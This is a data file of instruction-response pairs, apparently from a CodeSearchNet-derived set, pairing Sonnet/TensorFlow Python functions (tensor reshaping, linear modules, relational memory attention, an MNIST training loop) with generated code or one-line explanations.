{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconverting a string to a snake_case string.", "response": "def to_snake_case(camel_case):\n  \"\"\"Returns a CamelCase string as a snake_case string.\"\"\"\n  if not re.match(r\"^[A-Za-z_]\\w*$\", camel_case):\n    raise ValueError(\n        \"Input string %s is not a valid Python identifier.\" % camel_case)\n\n  # Add underscore at word start and ends.\n  underscored = re.sub(r\"([A-Z][a-z])\", r\"_\\1\", camel_case)\n  underscored = re.sub(r\"([a-z])([A-Z])\", r\"\\1_\\2\", underscored)\n  # Add underscore before alphanumeric chunks.\n  underscored = re.sub(r\"([a-z])([0-9][^_]*)\", r\"\\1_\\2\", underscored)\n  # Remove any underscores at start or end of name and convert to lowercase.\n  return underscored.strip(\"_\").lower()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncall callback for all newly created variables.", "response": "def notify_about_new_variables(callback):\n  \"\"\"Calls `callback(var)` for all newly created variables.\n\n  Callback should not modify the variable passed in. Use cases that require\n  variables to be modified should use `variable_creator_scope` directly and sit\n  within the variable creator stack.\n\n  >>> variables = []\n  >>> with notify_about_variables(variables.append):\n  ...   v = tf.Variable(1.0, name='v')\n  ...   w = tf.get_variable('w', [])\n  >>> assert variables == [v, w]\n\n  Args:\n    callback: a callable taking a single argument which is a tf.Variable.\n\n  Yields:\n    `None` - used for contextmanager API.\n  \"\"\"\n  def _tracking_creator(getter, **kwargs):\n    v = getter(**kwargs)\n    callback(v)\n    return v\n\n  with tf.variable_creator_scope(_tracking_creator):\n    yield"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _recursive_getattr(module, path):\n  if \".\" not in path:\n    return getattr(module, path)\n  else:\n    first, rest = path.split(\".\", 1)\n    return _recursive_getattr(getattr(module, first), rest)", "response": "Recursively gets attributes inside module as specified by path."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_string_to_constructor(ctor_string):\n  orig_ctor_string = ctor_string\n  if \".\" not in ctor_string:\n    # No module specified - assume part of Sonnet\n    ctor_string = \"sonnet.\" + ctor_string\n\n  if ctor_string.startswith(\"snt.\"):\n    # Replace common short name with full name\n    ctor_string = \"sonnet.\" + ctor_string[len(\"snt.\"):]\n\n  # Cannot just use importlib directly because of the way we alias subpackages,\n  # i.e. 'sonnet.nets.ConvNet2D' does not work because 'sonnet.nets' is actually\n  # stored as 'sonnet.python.modules.nets'. To support these aliases we use\n  # importlib only for the top level package, and then recursive getattr.\n  package_name, rest = ctor_string.split(\".\", 1)\n  package = importlib.import_module(package_name)\n  try:\n    return _recursive_getattr(package, rest)\n  except AttributeError:\n    raise ValueError(\"could not find `{}`, after normalizing to `{}`\".format(\n        orig_ctor_string, ctor_string))", "response": "Converts a string representation of a module in Sonnet to a callable which corresponds to the string representation of a module."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef supports_kwargs(module_or_fn, kwargs_list):\n  if isinstance(kwargs_list, six.string_types):\n    kwargs_list = [kwargs_list]\n\n  # If it's not a function or method, then assume it's a module, so introspect\n  # the __call__ method. wrapt ensures that for Sonnet modules the _build\n  # signature is available here.\n  if not (inspect.isfunction(module_or_fn) or inspect.ismethod(module_or_fn)):\n    module_or_fn = module_or_fn.__call__\n\n  arg_spec = inspect.getargspec(module_or_fn)\n\n  # If there is a keywords element, then an arbitrary kwargs will work, as far\n  # as we can tell from here.\n  takes_arbitrary_kwargs = (arg_spec.keywords is not None)\n\n  for kwarg in kwargs_list:\n    if not isinstance(kwarg, six.string_types):\n      raise ValueError(\"kwargs should be strings, instead got {}\".format(\n          kwarg))\n    if kwarg not in arg_spec.args:\n      if not takes_arbitrary_kwargs:\n        # The function doesn't take **kwargs, and this name is not in the\n        # regular args, so it would definitely cause an error to call this.\n        return NOT_SUPPORTED\n      else:\n        # The function may accept the kwarg, but we can't say for sure. Even\n        # though this is only one kwarg, we can't be certain about the whole\n        # lot, so the combined answer is now \"maybe\".\n        return MAYBE_SUPPORTED\n  # All the kwargs must actually be present in the specific args list\n  return SUPPORTED", "response": "Determines whether the provided callable supports all the kwargs."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef remove_unsupported_kwargs(module_or_fn, all_kwargs_dict):\n  if all_kwargs_dict is None:\n    all_kwargs_dict = {}\n  if not isinstance(all_kwargs_dict, dict):\n    raise ValueError(\"all_kwargs_dict must be a dict with string keys.\")\n  return {\n      kwarg: value for kwarg, value in all_kwargs_dict.items()\n      if supports_kwargs(module_or_fn, kwarg) != NOT_SUPPORTED\n  }", "response": "Removes any kwargs not supported by module_or_fn from all_kwargs_dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nmerges the first dimensions of a tensor.", "response": "def merge_leading_dims(array_or_tensor, n_dims=2):\n  \"\"\"Merge the first dimensions of a tensor.\n\n  Args:\n    array_or_tensor: Tensor to have its first dimensions merged. Can also\n        be an array or numerical value, which will be converted to a tensor\n        for batch application, if needed.\n    n_dims: Number of dimensions to merge.\n\n  Returns:\n    Either the input value converted to a Tensor, with the requested dimensions\n    merged, or the unmodified input value if the input has less than `n_dims`\n    dimensions.\n\n  Raises:\n    ValueError: If the rank of `array_or_tensor` is not well-defined.\n  \"\"\"\n  tensor = tf.convert_to_tensor(array_or_tensor)\n  tensor_shape_static = tensor.get_shape()\n\n  # Check if the rank of the input tensor is well-defined.\n  if tensor_shape_static.dims is None:\n    raise ValueError(\"Can't merge leading dimensions of tensor of unknown \"\n                     \"rank.\")\n  tensor_shape_list = tensor_shape_static.as_list()\n\n  # We can only merge the n_dims leading dimensions if the rank of the given\n  # tensor is sufficiently large.\n  if n_dims > len(tensor_shape_list):\n    return array_or_tensor\n\n  if tensor_shape_static.is_fully_defined():\n    new_shape = (\n        [np.prod(tensor_shape_list[:n_dims])] + tensor_shape_list[n_dims:])\n\n    return tf.reshape(tensor, new_shape)\n\n  # Shape can't be inferred statically.\n  tensor_shape = tf.shape(tensor)\n  new_first_dim = tf.reduce_prod(tensor_shape[:n_dims], keepdims=True)\n  other_dims = tensor_shape[n_dims:]\n  new_size = tf.concat([new_first_dim, other_dims], 0)\n  result = tf.reshape(tensor, new_size)\n\n  if all(value is not None for value in tensor_shape_list[:n_dims]):\n    merged_leading_size = np.prod(tensor_shape_list[:n_dims])\n  else:\n    merged_leading_size = None\n  # We need to set the result size of this, as otherwise we won't be able to\n  # pass to e.g. a Linear. Here we need to know at least the rank of the tensor.\n  result.set_shape([merged_leading_size] + tensor_shape_list[n_dims:])\n  return result"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef split_leading_dim(tensor, inputs, n_dims=2):\n  input_shape_static = inputs.get_shape()\n  input_shape_list = input_shape_static.as_list()\n  tensor_shape_static = tensor.get_shape()\n  tensor_shape_list = tensor_shape_static.as_list()\n  if (input_shape_static.is_fully_defined()\n      and tensor_shape_static.is_fully_defined()):\n    new_shape = input_shape_list[:n_dims] + tensor_shape_list[1:]\n    return tf.reshape(tensor, new_shape)\n\n  # Shape can't be inferred statically.\n  dims_after_first = tf.shape(tensor)[1:]\n  split_sizes = tf.shape(inputs)[:n_dims]\n  known_split_sizes = input_shape_list[:n_dims]\n  known_dims_after_first = tensor_shape_list[1:]\n  output_size = tf.concat([split_sizes, dims_after_first], 0)\n  result = tf.reshape(tensor, output_size)\n  result.set_shape(known_split_sizes + known_dims_after_first)\n  return result", "response": "Splits the first dimension of a tensor."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a default initializer for weights of a linear module.", "response": "def create_linear_initializer(input_size, dtype=tf.float32):\n  \"\"\"Returns a default initializer for weights of a linear module.\"\"\"\n  stddev = 1 / math.sqrt(input_size)\n  return tf.truncated_normal_initializer(stddev=stddev, dtype=dtype)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncalculate the bias_shape based on the input_shape and bias_dims.", "response": "def calculate_bias_shape(input_shape, bias_dims):\n  \"\"\"Calculate `bias_shape` based on the `input_shape` and `bias_dims`.\n\n  Args:\n    input_shape: Shape of the input being passed into the module. The leading\n        dimension is the minibatch size.\n    bias_dims: The dimensions that bias should be applied over. The remaining\n        dimensions will get broadcasted over.\n\n  Returns:\n    bias_shape: Tuple corresponding to the shape of bias Variable to create.\n\n  Raises:\n    ValueError: If the user attempts to add bias over the minibatch dimension,\n        e.g. `bias_dims=[0]`.\n  \"\"\"\n  input_rank = len(input_shape)\n  # If None, default is to use all dimensions.\n  if bias_dims is None:\n    return input_shape[1:]\n  # If empty list, use a scalar bias.\n  elif not bias_dims:\n    return ()\n  # Otherwise, calculate bias_shape from bias_dims.\n  else:\n    bias_shape = [1] * input_rank\n    # Populate bias dimensions.\n    for dim in bias_dims:\n      dim %= input_rank\n      if dim == 0:\n        raise ValueError(\"Cannot apply bias across the minibatch dimension.\")\n      bias_shape[dim] = input_shape[dim]\n    # Strip leading unit dimensions.\n    start = input_rank\n    for dim in xrange(1, input_rank):\n      if bias_shape[dim] != 1:\n        start = dim\n        break\n    return tuple(bias_shape[start:])"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _build(self, inputs):\n    input_shape = tuple(inputs.get_shape().as_list())\n\n    if len(input_shape) != 2:\n      raise base.IncompatibleShapeError(\n          \"{}: rank of shape must be 2 not: {}\".format(\n              self.scope_name, len(input_shape)))\n\n    if input_shape[1] is None:\n      raise base.IncompatibleShapeError(\n          \"{}: Input size must be specified at module build time\".format(\n              self.scope_name))\n\n    if self._input_shape is not None and input_shape[1] != self._input_shape[1]:\n      raise base.IncompatibleShapeError(\n          \"{}: Input shape must be [batch_size, {}] not: [batch_size, {}]\"\n          .format(self.scope_name, self._input_shape[1], input_shape[1]))\n\n    self._input_shape = input_shape\n    dtype = inputs.dtype\n\n    if \"w\" not in self._initializers:\n      self._initializers[\"w\"] = create_linear_initializer(self._input_shape[1],\n                                                          dtype)\n\n    if \"b\" not in self._initializers and self._use_bias:\n      self._initializers[\"b\"] = create_bias_initializer(self._input_shape[1],\n                                                        dtype)\n\n    weight_shape = (self._input_shape[1], self.output_size)\n    self._w = tf.get_variable(\"w\",\n                              shape=weight_shape,\n                              dtype=dtype,\n                              initializer=self._initializers[\"w\"],\n                              partitioner=self._partitioners.get(\"w\", None),\n                              regularizer=self._regularizers.get(\"w\", None))\n    outputs = tf.matmul(inputs, self._w)\n\n    if self._use_bias:\n      bias_shape = (self.output_size,)\n      self._b = tf.get_variable(\"b\",\n                                shape=bias_shape,\n                                dtype=dtype,\n                                initializer=self._initializers[\"b\"],\n                                partitioner=self._partitioners.get(\"b\", None),\n                                regularizer=self._regularizers.get(\"b\", None))\n      outputs += self._b\n\n    return outputs", "response": "Connects the Linear module into the graph with input Tensor inputs."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef output_size(self):\n    if callable(self._output_size):\n      self._output_size = self._output_size()\n    return self._output_size", "response": "Returns the module output size."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a cloned Linear module.", "response": "def clone(self, name=None):\n    \"\"\"Returns a cloned `Linear` module.\n\n    Args:\n      name: Optional string assigning name of cloned module. The default name\n          is constructed by appending \"_clone\" to `self.module_name`.\n\n    Returns:\n      Cloned `Linear` module.\n    \"\"\"\n    if name is None:\n      name = self.module_name + \"_clone\"\n    return Linear(output_size=self.output_size,\n                  use_bias=self._use_bias,\n                  initializers=self._initializers,\n                  partitioners=self._partitioners,\n                  regularizers=self._regularizers,\n                  name=name)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _build(self, inputs_list):\n    outputs = []\n    for idx, tensor in enumerate(inputs_list):\n      outputs.append(\n          Linear(\n              self._output_size,\n              initializers=self._initializers,\n              partitioners=self._partitioners,\n              regularizers=self._regularizers,\n              # Since we are interpreting this as 'one big linear', we only need\n              # one bias.\n              use_bias=(idx == 0 and self._use_bias))(tensor))\n    return tf.add_n(outputs)", "response": "Connects the module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nconnecting the Add module into the graph with input Tensor inputs.", "response": "def _build(self, inputs, multiplier=1):\n    \"\"\"Connects the Add module into the graph, with input Tensor `inputs`.\n\n    Args:\n      inputs: A Tensor of size `[batch_size, input_size1, ...]`.\n      multiplier: A scalar or Tensor which the bias term is multiplied by\n        before adding it to `inputs`. Anything which works in the expression\n        `bias * multiplier` is acceptable here. This may be useful if you want\n        to add a bias in one place and subtract the same bias in another place\n        via `multiplier=-1`.\n\n    Returns:\n      A Tensor of size `[batch_size, input_size1, ...]`.\n\n    Raises:\n      base.IncompatibleShapeError: If the input is not a >= 2D `Tensor`.\n      base.IncompatibleShapeError: If connecting the module into the graph\n          any time after the first time, and the inferred size of the input does\n          not match previous invocations.\n      base.IncompatibleShapeError: If the `output_shape` has been specified\n          but it does not match the input_shape`.\n      base.ParentNotBuiltError: If the module is a transposed and the original\n          untransposed module has not been built.\n    \"\"\"\n    input_shape = tuple(inputs.get_shape().as_list())\n    bias_shape = calculate_bias_shape(input_shape, self._bias_dims)\n\n    # Check always contains minibatched input.\n    if len(input_shape) < 2:\n      raise base.IncompatibleShapeError(\n          \"Rank of input shape must be >=2 not: {}.\".format(len(input_shape)))\n\n    # Check previous input size is same as new input size.\n    if (self._input_shape is not None and\n        input_shape[1:] != self._input_shape[1:]):\n      raise base.IncompatibleShapeError(\"Input shape has changed.\")\n\n    # If transposed, make sure that the original Module is built.\n    if callable(self._output_shape):\n      self._output_shape = self._output_shape()\n      if self._output_shape is None:\n        raise base.ParentNotBuiltError(\n            \"Build the original untransposed module before building this one.\")\n\n    # If output_shape specified, check that it matches input_shape.\n    if (self._output_shape is not None and\n        self._output_shape[1:] != input_shape[1:]):\n      raise base.IncompatibleShapeError(\n          \"Input shape must be {} not: {}.\".format(self._output_shape,\n                                                   input_shape[1]))\n\n    self._input_shape = input_shape\n    dtype = inputs.dtype\n\n    if \"b\" not in self._initializers:\n      self._initializers[\"b\"] = create_bias_initializer(bias_shape, dtype)\n\n    self._b = tf.get_variable(\n        \"b\",\n        shape=bias_shape,\n        dtype=dtype,\n        initializer=self._initializers[\"b\"],\n        partitioner=self._partitioners.get(\"b\", None),\n        regularizer=self._regularizers.get(\"b\", None))\n\n    bias = self._b\n    if multiplier != 1:\n      bias = bias * multiplier  # pylint: disable=g-no-augmented-assignment\n    outputs = inputs + bias\n    return outputs"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a transpose of the add bias module.", "response": "def transpose(self, name=None):\n    \"\"\"Returns transposed `AddBias` module.\n\n    Args:\n      name: Optional string assigning name of transpose module. The default name\n          is constructed by appending \"_transpose\" to `self.module_name`.\n\n    Returns:\n      Transposed `AddBias` module.\n    \"\"\"\n\n    if name is None:\n      name = self.module_name + \"_transpose\"\n    return AddBias(output_shape=lambda: self._input_shape,\n                   bias_dims=self._bias_dims,\n                   initializers=self._initializers,\n                   regularizers=self._regularizers,\n                   name=name)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _infer_shape(self, dimensions):\n    # Size of input\n    n = np.prod(dimensions)\n    # Size of output where defined\n    m = np.prod(abs(np.array(self._shape)))\n    # Replace wildcard\n    v = np.array(self._shape)\n    v[v == -1] = n // m\n    return tuple(v)", "response": "Infer the output shape vector given the input dimensions."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _build(self, inputs):\n    full_input_shape = inputs.get_shape().as_list()\n    if len(full_input_shape) < self._preserve_dims:\n      raise ValueError(\"Input tensor has {} dimensions, should have at least \"\n                       \"as many as preserve_dims={}\".format(\n                           len(full_input_shape),\n                           self._preserve_dims))\n    self._input_shape = full_input_shape[self._preserve_dims:]\n\n    if callable(self._shape):\n      self._shape = tuple(self._shape())\n\n    # Special-case of 1 non-preserved dimension, where no reshape is necessary.\n    # This is useful if the non-preserved dimension of `inputs` is unknown\n    # at build time.\n    if len(self._input_shape) == 1 and len(self._shape) == 1:\n      if self._shape[0] == -1 or self._shape[0] == self._input_shape[0]:\n        return inputs\n      else:\n        if self._input_shape[0] is None:\n          raise ValueError(\"Unknown non-preserved dimensions are not allowed \"\n                           \"in the input to BatchReshape unless it is only one \"\n                           \"and the desired shape is (-1,).\")\n        else:\n          raise ValueError(\"Output shape is incompatible with input shape\")\n\n    if not all([isinstance(x, numbers.Integral) and (x > 0 or x == -1)\n                for x in self._shape]):\n      raise ValueError(\n          \"Desired shape can only contain positive integral numbers \"\n          \"and the wildcard -1. Given shape {}\".format(self._shape))\n\n    if self._shape.count(-1) > 1:\n      raise ValueError(\n          \"Wildcard -1 can appear only once in desired output shape. \"\n          \"Given shape {}\".format(self._shape))\n\n    preserved_shape = tf.shape(inputs)[:self._preserve_dims]\n    # Slicing the shape tensor loses information, we keep it in a list.\n    preserved_shape_list = inputs.get_shape()[:self._preserve_dims]\n\n    # Except in the case above where no reshape is needed, we do not allow\n    # unknown non-preserved dimensions in the input.\n    if None in self._input_shape:\n      raise ValueError(\"Unknown non-preserved dimensions are not allowed in \"\n                       \"the input to BatchReshape unless it is only one and the\"\n                       \" desired shape is (-1,). The offending non-preserved \"\n                       \"input shape is {}\".format(self._input_shape))\n    if self._shape.count(-1) > 0:\n      trailing_shape = self._infer_shape(self._input_shape)\n    else:\n      trailing_shape = self._shape\n\n    if np.prod(self._input_shape) != np.prod(trailing_shape):\n      raise ValueError(\"Output shape is incompatible with input shape\")\n\n    shape = tf.concat([preserved_shape, trailing_shape], 0)\n    output = tf.reshape(inputs, shape)\n\n    # Include shape information that was lost when we sliced the shape tensor.\n    shape_list = preserved_shape_list.concatenate(trailing_shape)\n    output.set_shape(shape_list)\n\n    return output", "response": "Connects the module into the graph with input Tensor inputs."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn transpose batch reshape.", "response": "def transpose(self, name=None):\n    \"\"\"Returns transpose batch reshape.\"\"\"\n    if name is None:\n      name = self.module_name + \"_transpose\"\n    return BatchReshape(shape=lambda: self.input_shape,\n                        preserve_dims=self._preserve_dims,\n                        name=name)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _build(self):\n    if \"w\" not in self._initializers:\n      stddev = 1 / math.sqrt(np.prod(self._shape))\n      self._initializers[\"w\"] = tf.truncated_normal_initializer(stddev=stddev)\n\n    self._w = tf.get_variable(\"w\",\n                              shape=self._shape,\n                              dtype=self._dtype,\n                              initializer=self._initializers[\"w\"],\n                              partitioner=self._partitioners.get(\"w\", None),\n                              regularizer=self._regularizers.get(\"w\", None))\n    return self._w", "response": "Connects the TrainableTensor module into the graph."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconnects the BatchApply module into the graph.", "response": "def _build(self, *args, **kwargs):\n    \"\"\"Connects the BatchApply module into the graph.\n\n    Args:\n      *args: a Tensor or a nested list or dictionary of Tensors. The input\n          tensors will have their first dimensions merged, then an op or a\n          module will be called on the input. The first dimension of the output\n          tensor(s) will be split again based on the leading dimensions of the\n          first input tensor.\n      **kwargs: Dictionary of named arguments; used in the same way as `*args`.\n\n    Returns:\n      A Tensor or nested list or dictionary of Tensors as a result of applying\n      the process above. (\"None\" return values are also supported.)\n    \"\"\"\n    flattened = nest.flatten([args, kwargs])\n    merged_flattened = [\n        merge_leading_dims(inp, self._n_dims) if inp is not None else None\n        for inp in flattened]\n    merged_args, merged_kwargs = nest.pack_sequence_as([args, kwargs],\n                                                       merged_flattened)\n\n    results = self._module(*merged_args, **merged_kwargs)\n\n    # Unmerging takes the sizes of the leading dimensions from an input example\n    # with equal shape for the leading `n_dims` dimensions. Typically this is\n    # the first input.\n    example_input = tf.convert_to_tensor(flattened[self._input_example_index])\n    def _split_to_original_leading_dims(result):\n      if result is None:\n        return None\n      else:\n        return split_leading_dim(result, example_input, self._n_dims)\n\n    flat_results = nest.flatten(results)\n    flat_unmerged_results = [_split_to_original_leading_dims(result)\n                             for result in flat_results]\n    return nest.pack_sequence_as(results, flat_unmerged_results)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nconnect the SliceByDim module into the graph.", "response": "def _build(self, inputs):\n    \"\"\"Connects the SliceByDim module into the graph.\n\n    Args:\n      inputs: `Tensor` to slice. Its rank must be greater than the maximum\n          dimension specified in `dims` (plus one as python is 0 indexed).\n\n    Returns:\n      The sliced tensor.\n\n    Raises:\n      ValueError: If `inputs` tensor has insufficient rank.\n    \"\"\"\n    shape_inputs = inputs.get_shape().as_list()\n    rank = len(shape_inputs)\n\n    # Checks that the rank of the tensor.\n    max_dim = np.max(self._dims) + 1\n    if rank < max_dim:\n      raise ValueError(\"Rank of inputs must be at least {}.\".format(max_dim))\n\n    # Builds default lists for begin and size to pass to `tf.slice`.\n    full_begin = [0] * rank\n    full_size = [-1] * rank\n\n    # Updates lists with what the user provided.\n    for dim, begin, size in zip(self._dims, self._begin, self._size):\n      full_begin[dim] = begin\n      full_size[dim] = size\n\n    return tf.slice(inputs, begin=full_begin, size=full_size)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconnect the TileByDim module into the graph.", "response": "def _build(self, inputs):\n    \"\"\"Connects the `TileByDim` module into the graph.\n\n    Args:\n      inputs: `Tensor` to tile.\n\n    Returns:\n      The tiled tensor.\n    \"\"\"\n    shape_inputs = inputs.get_shape().as_list()\n    rank = len(shape_inputs)\n\n    # Builds default lists for multiples to pass to `tf.tile`.\n    full_multiples = [1] * rank\n\n    # Updates lists with what the user provided.\n    for dim, multiple in zip(self._dims, self._multiples):\n      full_multiples[dim] = multiple\n\n    return tf.tile(inputs, multiples=full_multiples)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconnect the MergeDims module into the graph.", "response": "def _build(self, inputs):\n    \"\"\"Connects the MergeDims module into the graph.\n\n    Args:\n      inputs: Tensor or a nested list of Tensors to merge. Its rank must be\n          greater than or equal to `start` + `size`.\n\n    Returns:\n      The merged Tensor or a nested list of merged Tensors.\n\n    Raises:\n      ValueError: If any of the `inputs` tensors has insufficient rank.\n    \"\"\"\n    if nest.is_sequence(inputs):\n      merged_tensors = [self._merge(tensor) for tensor in nest.flatten(inputs)]\n      return nest.pack_sequence_as(inputs, merged_tensors)\n\n    # inputs is a single tf.Tensor\n    return self._merge(inputs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef initial_state(self, batch_size, trainable=False):\n    init_state = tf.eye(self._mem_slots, batch_shape=[batch_size])\n\n    # Pad the matrix with zeros.\n    if self._mem_size > self._mem_slots:\n      difference = self._mem_size - self._mem_slots\n      pad = tf.zeros((batch_size, self._mem_slots, difference))\n      init_state = tf.concat([init_state, pad], -1)\n    # Truncation. Take the first `self._mem_size` components.\n    elif self._mem_size < self._mem_slots:\n      init_state = init_state[:, :, :self._mem_size]\n    return init_state", "response": "Creates the initial state of the memory."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nperform multi - head attention from Attention is All You Need.", "response": "def _multihead_attention(self, memory):\n    \"\"\"Perform multi-head attention from 'Attention is All You Need'.\n\n    Implementation of the attention mechanism from\n    https://arxiv.org/abs/1706.03762.\n\n    Args:\n      memory: Memory tensor to perform attention on.\n\n    Returns:\n      new_memory: New memory tensor.\n    \"\"\"\n    key_size = self._key_size\n    value_size = self._head_size\n\n    qkv_size = 2 * key_size + value_size\n    total_size = qkv_size * self._num_heads  # Denote as F.\n    qkv = basic.BatchApply(basic.Linear(total_size))(memory)\n    qkv = basic.BatchApply(layer_norm.LayerNorm())(qkv)\n\n    mem_slots = memory.get_shape().as_list()[1]  # Denoted as N.\n\n    # [B, N, F] -> [B, N, H, F/H]\n    qkv_reshape = basic.BatchReshape([mem_slots, self._num_heads,\n                                      qkv_size])(qkv)\n\n    # [B, N, H, F/H] -> [B, H, N, F/H]\n    qkv_transpose = tf.transpose(qkv_reshape, [0, 2, 1, 3])\n    q, k, v = tf.split(qkv_transpose, [key_size, key_size, value_size], -1)\n\n    q *= key_size ** -0.5\n    dot_product = tf.matmul(q, k, transpose_b=True)  # [B, H, N, N]\n    weights = tf.nn.softmax(dot_product)\n\n    output = tf.matmul(weights, v)  # [B, H, N, V]\n\n    # [B, H, N, V] -> [B, N, H, V]\n    output_transpose = tf.transpose(output, [0, 2, 1, 3])\n\n    # [B, N, H, V] -> [B, N, H * V]\n    new_memory = basic.BatchFlatten(preserve_dims=2)(output_transpose)\n    return new_memory"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate input and forget gates for this step using inputs and memory.", "response": "def _create_gates(self, inputs, memory):\n    \"\"\"Create input and forget gates for this step using `inputs` and `memory`.\n\n    Args:\n      inputs: Tensor input.\n      memory: The current state of memory.\n\n    Returns:\n      input_gate: A LSTM-like insert gate.\n      forget_gate: A LSTM-like forget gate.\n    \"\"\"\n    # We'll create the input and forget gates at once. Hence, calculate double\n    # the gate size.\n    num_gates = 2 * self._calculate_gate_size()\n\n    memory = tf.tanh(memory)\n    inputs = basic.BatchFlatten()(inputs)\n    gate_inputs = basic.BatchApply(basic.Linear(num_gates), n_dims=1)(inputs)\n    gate_inputs = tf.expand_dims(gate_inputs, axis=1)\n    gate_memory = basic.BatchApply(basic.Linear(num_gates))(memory)\n    gates = tf.split(gate_memory + gate_inputs, num_or_size_splits=2, axis=2)\n    input_gate, forget_gate = gates\n\n    input_gate = tf.sigmoid(input_gate + self._input_bias)\n    forget_gate = tf.sigmoid(forget_gate + self._forget_bias)\n\n    return input_gate, forget_gate"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nperforming multiheaded attention over memory.", "response": "def _attend_over_memory(self, memory):\n    \"\"\"Perform multiheaded attention over `memory`.\n\n    Args:\n      memory: Current relational memory.\n\n    Returns:\n      The attended-over memory.\n    \"\"\"\n    attention_mlp = basic.BatchApply(\n        mlp.MLP([self._mem_size] * self._attention_mlp_layers))\n    for _ in range(self._num_blocks):\n      attended_memory = self._multihead_attention(memory)\n\n      # Add a skip connection to the multiheaded attention's input.\n      memory = basic.BatchApply(layer_norm.LayerNorm())(\n          memory + attended_memory)\n\n      # Add a skip connection to the attention_mlp's input.\n      memory = basic.BatchApply(layer_norm.LayerNorm())(\n          attention_mlp(memory) + memory)\n\n    return memory"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _build(self, inputs, memory, treat_input_as_matrix=False):\n    if treat_input_as_matrix:\n      inputs = basic.BatchFlatten(preserve_dims=2)(inputs)\n      inputs_reshape = basic.BatchApply(\n          basic.Linear(self._mem_size), n_dims=2)(inputs)\n    else:\n      inputs = basic.BatchFlatten()(inputs)\n      inputs = basic.Linear(self._mem_size)(inputs)\n      inputs_reshape = tf.expand_dims(inputs, 1)\n\n    memory_plus_input = tf.concat([memory, inputs_reshape], axis=1)\n    next_memory = self._attend_over_memory(memory_plus_input)\n\n    n = inputs_reshape.get_shape().as_list()[1]\n    next_memory = next_memory[:, :-n, :]\n\n    if self._gate_style == 'unit' or self._gate_style == 'memory':\n      self._input_gate, self._forget_gate = self._create_gates(\n          inputs_reshape, memory)\n      next_memory = self._input_gate * tf.tanh(next_memory)\n      next_memory += self._forget_gate * memory\n\n    output = basic.BatchFlatten()(next_memory)\n    return output, next_memory", "response": "Builds the graph for the time step."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef train_and_eval(train_batch_size, test_batch_size, num_hidden, learning_rate,\n                   num_train_steps, report_every, test_every):\n  \"\"\"Creates a basic MNIST model using Sonnet, then trains and evaluates it.\"\"\"\n\n  data_dict = dataset_mnist.get_data(\"mnist\", train_batch_size, test_batch_size)\n  train_data = data_dict[\"train_iterator\"]\n  test_data = data_dict[\"test_iterator\"]\n\n  # Sonnet separates the configuration of a model from its attachment into the\n  # graph. Here we configure the shape of the model, but this call does not\n  # place any ops into the graph.\n  mlp = snt.nets.MLP([num_hidden, data_dict[\"num_classes\"]])\n\n  train_images, train_labels = train_data.get_next()\n  test_images, test_labels = test_data.get_next()\n\n  # Flatten images to pass to model.\n  train_images = snt.BatchFlatten()(train_images)\n  test_images = snt.BatchFlatten()(test_images)\n\n  # Call our model, which creates it in the graph. Our build function\n  # is parameterized by the source of images, and here we connect the model to\n  # the training images.\n  train_logits = mlp(train_images)\n\n  # Training loss and optimizer.\n  loss = tf.nn.sparse_softmax_cross_entropy_with_logits(\n      labels=train_labels, logits=train_logits)\n  loss_avg = tf.reduce_mean(loss)\n  optimizer = tf.train.GradientDescentOptimizer(learning_rate)\n  optimizer_step = optimizer.minimize(loss_avg)\n\n  # As before, we make a second instance of our model in the graph, which shares\n  # its parameters with the first instance of the model. The Sonnet Module code\n  # takes care of the variable sharing for us: because we are calling the same\n  # instance of Model, we will automatically reference the same, shared\n  # variables.\n  test_logits = mlp(test_images)\n  test_classes = tf.nn.softmax(test_logits)\n  test_correct = tf.nn.in_top_k(test_classes, test_labels, k=1)\n\n  with tf.train.SingularMonitoredSession() as sess:\n\n    for step_idx in range(num_train_steps):\n      current_loss, _ = sess.run([loss_avg, optimizer_step])\n      if step_idx % report_every == 0:\n        tf.logging.info(\"Step: %4d of %d - loss: %.02f.\",\n                        step_idx + 1, num_train_steps, current_loss)\n      if step_idx % test_every == 0:\n        sess.run(test_data.initializer)\n        current_correct = sess.run(test_correct)\n        correct_count = np.count_nonzero(current_correct)\n        tf.logging.info(\"Test: %d of %d correct.\",\n                        correct_count, test_batch_size)", "response": "Creates a basic MNIST model using Sonnet."}
